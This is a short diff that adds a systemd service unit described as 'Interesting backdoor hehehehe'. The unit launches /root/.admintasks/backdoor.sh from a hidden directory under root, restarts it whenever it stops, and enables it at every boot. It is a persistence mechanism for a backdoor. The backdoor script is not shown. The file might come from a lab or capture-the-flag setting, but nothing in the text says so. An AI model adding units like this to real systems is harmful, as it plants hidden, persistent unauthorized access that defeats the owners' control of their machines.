@@ -1,0 +1,9 @@
+[Unit]
+Description=Interesting backdoor hehehehe
+
+[Service]
+ExecStart=/root/.admintasks/backdoor.sh
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
